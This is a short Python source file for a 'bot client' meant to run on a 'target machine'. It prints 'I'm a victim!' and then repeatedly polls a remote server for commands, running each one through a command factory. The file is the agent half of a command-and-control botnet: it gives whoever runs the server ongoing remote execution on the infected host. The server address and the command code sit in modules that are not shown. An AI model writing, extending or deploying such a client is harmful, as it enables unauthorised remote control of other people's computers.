"""
Bot client to execute on target machine as process

version 0.01
"""

import time
from client.Timer import Timer
import client.communication as c

from controllers.CommandFactory import CommandFactory

if __name__ == '__main__':
    print("I'm a victim!")
    command_factory = CommandFactory()
    while True:
        time.sleep(Timer.get_seconds())
        command_list = c.request_server('get_commands', 'get')

        for com in command_list:
            print(command_factory.create_command(com["com"], com["params"]).run())
